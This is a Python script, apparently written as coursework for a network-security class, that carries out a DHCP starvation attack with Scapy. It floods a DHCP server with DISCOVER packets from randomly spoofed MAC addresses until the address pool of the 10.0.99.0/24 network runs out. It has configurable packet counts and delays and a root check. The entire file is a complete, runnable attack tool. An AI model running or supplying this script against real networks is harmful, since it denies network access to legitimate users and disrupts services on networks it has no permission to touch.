#!/usr/bin/env python3
# =============================================================================
# DHCP Starvation Attack Script
# =============================================================================
# Autor     : Junior Javier Santos Perez
# Matricula : 2024-1599
# Curso     : Seguridad en Redes
# Descripcion: Script que realiza un ataque DHCP Starvation enviando solicitudes
#              DHCP DISCOVER masivas con direcciones MAC falsas (spoofed) para
#              agotar el pool de direcciones IP del servidor DHCP.
# Red       : 10.0.99.0/24
# Interfaz  : eth0
# =============================================================================

from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sendp, RandMAC, conf
)
import random
import time
import sys
import argparse

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURACION
# ─────────────────────────────────────────────────────────────────────────────
INTERFAZ       = "eth0"          # Interfaz de red del atacante
PAQUETES       = 1000            # Cantidad de solicitudes DHCP DISCOVER a enviar
DELAY          = 0.05            # Segundos entre cada paquete (50 ms)
VERBOSE        = True            # Mostrar progreso en pantalla


# ─────────────────────────────────────────────────────────────────────────────
# FUNCION: Construir paquete DHCP DISCOVER con MAC falsa
# ─────────────────────────────────────────────────────────────────────────────
def construir_dhcp_discover(mac_falsa: str) -> Ether:
    """
    Construye un paquete DHCP DISCOVER completo con una MAC falsificada.

    Capas del paquete:
    - Ethernet  : MAC origen = mac_falsa | MAC destino = broadcast (ff:ff:ff:ff:ff:ff)
    - IP        : src = 0.0.0.0 (sin IP aun) | dst = 255.255.255.255 (broadcast)
    - UDP       : sport = 68 (cliente DHCP) | dport = 67 (servidor DHCP)
    - BOOTP     : op=1 (REQUEST), chaddr = mac_falsa, xid = transaction ID aleatorio
    - DHCP      : message-type = discover (1)

    Parametros:
        mac_falsa (str): Direccion MAC generada aleatoriamente.

    Retorna:
        Ether: Paquete Scapy listo para enviar.
    """
    # Convertir MAC string a bytes para el campo chaddr de BOOTP
    mac_bytes = bytes.fromhex(mac_falsa.replace(":", ""))

    paquete = (
        Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            op=1,                              # 1 = BOOTREQUEST (cliente solicita)
            chaddr=mac_bytes,                  # Hardware address (MAC falsificada)
            xid=random.randint(1, 0xFFFFFFFF), # Transaction ID unico aleatorio
            flags=0x8000                       # Flag BROADCAST: el server responde en broadcast
        ) /
        DHCP(options=[
            ("message-type", "discover"),      # Tipo: DHCP DISCOVER
            "end"                              # Fin de opciones DHCP
        ])
    )
    return paquete


# ─────────────────────────────────────────────────────────────────────────────
# FUNCION: Ejecutar el ataque
# ─────────────────────────────────────────────────────────────────────────────
def ejecutar_ataque(interfaz: str, cantidad: int, delay: float, verbose: bool):
    """
    Ejecuta el ataque DHCP Starvation enviando multiples DHCP DISCOVER
    con MACs aleatorias para agotar el pool del servidor DHCP.

    Parametros:
        interfaz (str)  : Nombre de la interfaz de red (ej: eth0).
        cantidad (int)  : Numero total de paquetes a enviar.
        delay    (float): Tiempo de espera entre paquetes en segundos.
        verbose  (bool) : Si True, imprime progreso por cada paquete enviado.
    """
    conf.verb = 0  # Suprimir output interno de Scapy

    print("=" * 60)
    print("   DHCP STARVATION ATTACK")
    print("   Autor    : Junior Javier Santos Perez")
    print("   Matricula: 2024-1599")
    print("=" * 60)
    print(f"[*] Interfaz  : {interfaz}")
    print(f"[*] Paquetes  : {cantidad}")
    print(f"[*] Delay     : {delay}s entre paquetes")
    print(f"[*] Objetivo  : Agotar pool DHCP 10.0.99.0/24")
    print("=" * 60)
    print("[*] Iniciando ataque... Presiona Ctrl+C para detener.\n")

    enviados = 0

    try:
        for i in range(1, cantidad + 1):
            # Generar MAC aleatoria para cada solicitud
            mac_falsa = str(RandMAC())

            # Construir el paquete DHCP DISCOVER
            paquete = construir_dhcp_discover(mac_falsa)

            # Enviar el paquete por la capa 2 (Ethernet)
            sendp(paquete, iface=interfaz, verbose=False)
            enviados += 1

            if verbose:
                print(f"[+] Paquete {i:>5}/{cantidad} | MAC: {mac_falsa} | Enviado OK")

            # Esperar antes del siguiente paquete
            time.sleep(delay)

    except KeyboardInterrupt:
        print(f"\n[!] Ataque detenido manualmente por el usuario.")

    finally:
        print("\n" + "=" * 60)
        print(f"[*] Resumen del ataque:")
        print(f"    - Paquetes enviados : {enviados}")
        print(f"    - Interfaz usada    : {interfaz}")
        print(f"    - MACs falsificadas : {enviados} (una por paquete)")
        print("=" * 60)
        print("[*] Ataque finalizado.")


# ─────────────────────────────────────────────────────────────────────────────
# PUNTO DE ENTRADA
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="DHCP Starvation Attack - Junior Javier Santos Perez (2024-1599)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-i", "--interfaz",
        default=INTERFAZ,
        help=f"Interfaz de red a usar (default: {INTERFAZ})"
    )
    parser.add_argument(
        "-n", "--cantidad",
        type=int,
        default=PAQUETES,
        help=f"Numero de paquetes DHCP DISCOVER a enviar (default: {PAQUETES})"
    )
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=DELAY,
        help=f"Delay en segundos entre paquetes (default: {DELAY})"
    )
    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Modo silencioso: no mostrar cada paquete enviado"
    )

    args = parser.parse_args()

    # Verificar que se ejecuta como root
    import os
    if os.geteuid() != 0:
        print("[ERROR] Este script requiere privilegios de root.")
        print("        Ejecuta: sudo python3 dhcp_starvation.py")
        sys.exit(1)

    ejecutar_ataque(
        interfaz=args.interfaz,
        cantidad=args.cantidad,
        delay=args.delay,
        verbose=not args.quiet
    )


if __name__ == "__main__":
    main()
